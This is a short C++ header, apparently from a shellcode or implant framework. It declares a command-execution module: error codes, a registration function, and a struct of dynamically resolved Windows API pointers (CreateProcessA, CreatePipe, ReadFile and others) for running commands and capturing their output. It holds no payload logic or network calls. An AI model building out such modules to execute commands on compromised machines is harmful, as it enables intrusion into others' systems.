#include "shellcode.hpp"


#define CUSTOM_MODULE_EXECUTECOMMAND_FAIL_MALLOC_STRUCT    0x1001
#define CUSTOM_MODULE_EXECUTECOMMAND_FAIL_GET_POINTERS     0x1002
#define CUSTOM_MODULE_EXECUTECOMMAND_FAIL_REGISTER_MODULE  0x1003
#define CUSTOM_MODULE_EXECUTECOMMAND_FAIL_GET_MSVCRT 0x1004
#define ERROR_GET_POINTER_CUSTOM_MODULE_CREATEPROCESSA     0x1005
#define ERROR_GET_POINTER_CUSTOM_MODULE_READFILE     0x1006
#define ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE     0x1007
#define ERROR_GET_POINTER_CUSTOM_MODULE_CREATEPIPE     0x1008
#define ERROR_GET_POINTER_CUSTOM_MODULE_WAITFORSINGLEOBJECT     0x1009
#define ERROR_GET_POINTER_CUSTOM_MODULE_STRNCPY     0x100A
#define ERROR_GET_POINTER_CUSTOM_MODULE_MALLOC     0x100B
#define ERROR_GET_POINTER_CUSTOM_MODULE_FREE     0x100C




DWORD RegisterModule_ExecuteCommand(sh_context* ctx, uint32_t module_id);

using CreateProcessA_t = decltype(&CreateProcessA);
using ReadFile_t = decltype(&ReadFile);
using CloseHandle_t = decltype(&CloseHandle);
using CreatePipe_t = decltype(&CreatePipe);
using WaitForSingleObject_t = decltype(&WaitForSingleObject);
using strncpy_t = decltype(&strncpy);
using GetLastError_t = decltype(&GetLastError);
using malloc_t = decltype(&malloc);
using free_t = decltype(&free);

struct cmdexec_pointers {
    CreateProcessA_t fp_CreateProcessA;
    ReadFile_t fp_ReadFile;
    CloseHandle_t fp_CloseHandle;
    CreatePipe_t fp_CreatePipe;
    WaitForSingleObject_t fp_WaitForSingleObject;
    strncpy_t fp_strncpy;
    GetLastError_t fp_GetLastError;
    malloc_t fp_malloc;
    free_t fp_free;
};
